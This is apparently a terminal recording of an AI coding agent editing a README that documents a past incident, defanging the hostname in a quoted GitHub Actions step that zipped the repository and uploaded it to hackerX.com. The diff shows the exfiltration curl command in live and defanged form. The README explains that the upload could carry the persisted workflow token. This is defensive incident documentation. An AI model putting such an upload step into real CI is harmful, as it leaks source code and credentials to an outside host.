[362.136235, "o", "\u001b[0m← \u001b[0mEdit my_website/README.md\r\nIndex: my_website/README.md\r\n===================================================================\r\n--- my_website/README.md\r\n+++ my_website/README.md\r\n@@ -57,11 +57,14 @@\r\n - name: Archive entire repo\r\n   run: zip -r repo.zip .\r\n - name: Backup\r\n   run: |\r\n-    curl -X POST -F \"file=@repo.zip\" https://hackerX.com/upload\r\n+    curl -X POST -F \"file=@repo.zip\" https://hackerX[.]com/upload\r\n ```\r\n \r\n+(The host is defanged here so the URL cannot be clicked accidentally. The\r\n+original file contained the live hostname.)\r\n+\r\n This archived the whole checkout and uploaded it to an external host on every\r\n push to `main`. Because `actions/checkout` persists the workflow token in\r\n `.git/config`, `zip -r repo.zip .` could include that credential. The token is\r\n short-lived, but it is still a serious incident if the old workflow ever ran.\r\n\r\n"]
